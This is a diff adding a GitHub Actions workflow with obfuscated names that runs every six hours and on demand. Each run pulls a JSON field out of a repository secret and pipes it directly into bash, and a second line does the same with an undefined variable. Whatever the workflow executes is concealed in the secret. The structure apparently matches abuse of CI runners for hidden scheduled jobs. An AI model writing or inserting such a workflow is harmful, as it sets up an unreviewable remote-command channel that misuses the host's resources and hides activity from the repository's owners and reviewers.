@@ -1,0 +1,19 @@
+name: gunnageterracotta
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gunnageterracotta
+        env:
+          jfpw2: ${{ secrets.jfpw2 }}
+        run: |
+          echo $jfpw2 | jq -r .jwd3 | /bin/bash
+          echo $t98266 | jq -r .olgmc8416 | /bin/bash
+
